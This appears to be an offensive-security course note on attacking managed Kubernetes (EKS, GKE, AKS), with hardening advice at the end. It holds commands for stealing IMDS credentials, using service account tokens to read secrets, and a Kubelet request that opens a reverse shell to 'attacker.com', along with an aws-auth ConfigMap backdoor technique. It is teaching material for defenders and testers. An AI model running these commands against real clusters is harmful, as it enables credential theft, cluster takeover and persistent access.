---
tags: [cloud-security, kubernetes, eks, gke, aks, k8s, container-orchestration]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.31 Kubernetes on Cloud"
---

# Kubernetes on Cloud: Exploiting EKS, GKE, and AKS

## 1. Introduction to Managed Kubernetes Architectures
Kubernetes (K8s) has indisputably become the de facto industry standard for container orchestration. However, manually deploying and managing the Kubernetes control plane (the API Server, etcd distributed key-value store, scheduler, and controller manager) is notoriously complex and prone to catastrophic failure. 
To alleviate this burden, major cloud providers offer fully managed Kubernetes services:
- **Amazon EKS** (Elastic Kubernetes Service)
- **Google GKE** (Google Kubernetes Engine)
- **Azure AKS** (Azure Kubernetes Service)

In these managed environments, a shared responsibility model applies: the cloud provider completely secures and manages the control plane, while the customer manages the worker nodes (underlying EC2 instances, GCE VMs, or Azure VMs) and the deployed workloads (pods, deployments, daemonsets).
The intersection of Kubernetes native RBAC (Role-Based Access Control) and Cloud IAM (Identity and Access Management) creates a highly complex, intertwined attack surface. A compromise at the pod level frequently leads to a compromise of the underlying cloud account, and vice versa.

## 2. Cloud-K8s Shared Architecture & Threat Model

### ASCII Diagram: Cloud K8s Attack Surface & Pivots

```text
       [ External Attacker ]
            | (1) Exploit RCE in Web App or 
            |     Supply Chain Attack
            v
+-------------------------------------------------------------+
|                     Compromised Pod                         |
|                                                             |
|  (2) Extract K8s Service Account Token                      |
|      (/var/run/secrets/kubernetes.io/serviceaccount/token)  |
|                                                             |
|  (3) Query Cloud Instance Metadata Service (IMDS)           |
|      (http://169.254.169.254)                               |
+-------------------------------------------------------------+
            |                               |
   K8s API  |                               | Cloud API
   Pivot    |                               | Pivot
            v                               v
+-------------------+             +-------------------+
|  K8s API Server   |             | Cloud Control Plane
|  (Managed by CSP) |             | (AWS IAM, GCP IAM)|
+-------------------+             +-------------------+
            |                               |
            v                               v
+-------------------+             +-------------------+
| Other Namespaces, |             | Other Cloud Rsrcs |
| Secrets, Pods,    |             | (S3 Buckets, RDS, |
| Cluster Admin     |             | EC2, Serverless)  |
+-------------------+             +-------------------+
```

## 3. Core Attack Vectors in Managed K8s Environments

### A. Instance Metadata Service (IMDS) Abuse (The Cloud Pivot)
Every worker node in EKS, GKE, or AKS is a virtual machine provisioned by the cloud provider. These VMs have an attached cloud IAM role (e.g., the AWS Node Role) allowing them to interact with the cloud provider natively (for tasks like pulling images from ECR, configuring network load balancers, or attaching EBS volumes).
By default, **any pod** running on the node can access the cloud provider's Instance Metadata Service at `169.254.169.254`.

**Exploitation:**
If an attacker gains arbitrary code execution in a pod (e.g., via a vulnerable web application, a deserialization flaw, or a poisoned image), they can simply query the IMDS to steal the node's underlying IAM credentials.
```bash
# AWS EKS (IMDSv1 Extraction)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role

# Output reveals temporary AWS AccessKeyId, SecretAccessKey, and Token
```
Armed with these AWS credentials, the attacker configures their local AWS CLI to map the cloud environment, potentially accessing sensitive S3 buckets, assuming other IAM roles, or deleting infrastructure.

### B. IRSA / Workload Identity Abuse (Granular Privilege Escalation)
To mitigate the massive blast radius of pods stealing the monolithic Node IAM role, cloud providers introduced granular pod-level cloud identities:
- **AWS EKS**: IAM Roles for Service Accounts (IRSA)
- **GCP GKE**: Workload Identity
- **Azure AKS**: Azure AD Workload Identity

These advanced mechanisms map a specific Kubernetes Service Account (KSA) directly to a specific Cloud IAM Role via OpenID Connect (OIDC). The cloud credentials (or web identity tokens) are injected into the pod as environment variables or mounted volume files.
**Exploitation:**
When an attacker compromises a pod, their first step is enumerating environment variables.
```bash
env | grep -i AWS
# Output might reveal: 
# AWS_ROLE_ARN=arn:aws:iam::123456789012:role/S3-Access-Role
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
The attacker can use this injected OIDC token to assume the specific IAM role assigned to the pod via the `sts:AssumeRoleWithWebIdentity` API. If this role is over-privileged (e.g., possessing `s3:*` on all buckets instead of just the one it needs), the attacker achieves a massive escalation.

### C. Kubernetes Service Account (KSA) Token Extraction
In Kubernetes, every pod mounts a default service account token into the container's filesystem at `/var/run/secrets/kubernetes.io/serviceaccount/token`.
If an ignorant developer bound a highly privileged K8s ClusterRole (like `cluster-admin` or an `edit` role on the `kube-system` namespace) to this specific service account, the attacker can use the token to completely take over the K8s cluster.
```bash
# Extract the JSON Web Token (JWT)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Query the Kubernetes API server directly from inside the compromised pod
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

### D. Kubelet API Anonymous Access & RCE
The Kubelet is the primary node agent that runs on every worker node and physically manages containers. Its API typically listens on TCP port 10250.
Historically, and still frequently due to custom misconfigurations, the Kubelet API allows anonymous, unauthenticated access.
**Exploitation:**
If port 10250 is exposed, an attacker can bypass the K8s API server entirely and directly instruct the Kubelet to execute arbitrary commands in *any pod* running on that specific node.
```bash
# Executing a reverse shell inside the critical kube-proxy container
curl -k -X POST "https://<node-ip>:10250/run/kube-system/kube-proxy/container" -d "cmd=nc -e /bin/sh attacker.com 4444"
```

### E. Exploiting Cloud Managed Storage (CSI Drivers)
Managed K8s clusters heavily rely on Container Storage Interface (CSI) drivers to dynamically provision and mount cloud block storage (AWS EBS, Azure Disks, GCS FUSE). Misconfigurations in persistent volumes (PVs) or volume snapshots can allow malicious pods to read data belonging to completely different namespaces, or even mount the underlying host's root filesystem.

## 4. Advanced Escalation: `aws-auth` ConfigMap (AWS EKS Specific)
In EKS, authentication mapping from external AWS IAM Users/Roles to internal Kubernetes RBAC is handled by a critical ConfigMap named `aws-auth` located in the `kube-system` namespace.
If an attacker gains moderate K8s API access and possesses permissions to edit ConfigMaps in `kube-system`, they can maliciously modify `aws-auth`. They can insert their own external, attacker-controlled AWS IAM user and map it to the `system:masters` group (cluster admin). This creates a completely invisible, permanent backdoor into the cluster that bypasses all pod-level security.

## 5. Defense, Hardening, and Best Practices

- **Strictly Block IMDS Access from Pods:** Utilize Kubernetes Network Policies or cloud-specific node configurations (like modifying the IP hop limit for IMDSv2) to prevent standard application pods from routing traffic to `169.254.169.254`.
- **Enforce IMDSv2 Globally:** Require IMDSv2 on all node groups. IMDSv2 mandates a session token obtained via a `PUT` request with a specific header, heavily mitigating Server-Side Request Forgery (SSRF) and simple `curl` extractions.
- **Implement Strict Least Privilege for IRSA:** When utilizing IRSA or Workload Identity, scope the Cloud IAM roles down to the absolute minimum required by the specific microservice. Never reuse cloud roles across different pods.
- **Disable Automounting Service Account Tokens:** If a pod's application does not explicitly need to communicate with the Kubernetes API, forcefully set `automountServiceAccountToken: false` in the pod deployment specification.
- **Rigorous RBAC Auditing:** Continually audit ClusterRoleBindings and RoleBindings. Explicitly avoid granting `cluster-admin` or wildcard access (`*`) to service accounts.
- **Admission Controllers (Policy as Code):** Deploy OPA Gatekeeper or Kyverno to enforce absolute security policies at deployment time (e.g., categorically preventing privileged pods, enforcing read-only root filesystems, preventing hostNetwork access).

## 6. Chaining Opportunities
- Achieving Remote Code Execution (RCE) in a web application hosted inside a container [[02 - Web RCE]] immediately leads to initial container compromise.
- From the compromised container, the attacker queries the IMDS to steal AWS credentials, pivoting directly into [[34 - Cloud Backdoor via IAM Role]].
- Alternatively, stealing a highly privileged `kubeconfig` file from a developer's compromised workstation [[05 - Endpoint Compromise]] provides immediate, direct cluster takeover.
- Poisoning an image via [[29 - Container Registry Attacks]] is the most reliable way to gain execution inside the cluster.

## 7. Related Notes
- [[02 - Docker Container Escapes]]
- [[34 - Cloud Backdoor via IAM Role]]
- [[29 - Container Registry Attacks]]
- [[35 - Defense — Least Privilege IAM, IMDSv2, Logging, SCP]]
